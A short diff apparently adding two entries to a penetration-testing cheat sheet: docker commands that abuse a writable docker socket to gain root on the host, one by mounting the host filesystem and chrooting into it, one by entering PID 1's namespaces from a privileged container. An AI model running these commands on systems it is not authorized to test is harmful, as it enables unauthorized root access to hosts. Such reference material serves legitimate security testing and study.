@@ -1254,6 +1254,10 @@ docker ps
 
 # run shell in container
 docker exec -it container_ID_here /bin/bash
+
+# privilege escalation over writable docker socket (e.g. /var/run/docker.sock)
+docker -H unix:///path/to/writable/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
+docker -H unix:///path/to/writable/docker.sock run -it --privileged --pid=host ubuntu nsenter -t 1 -m -u -n -i sh
 ```
 
 
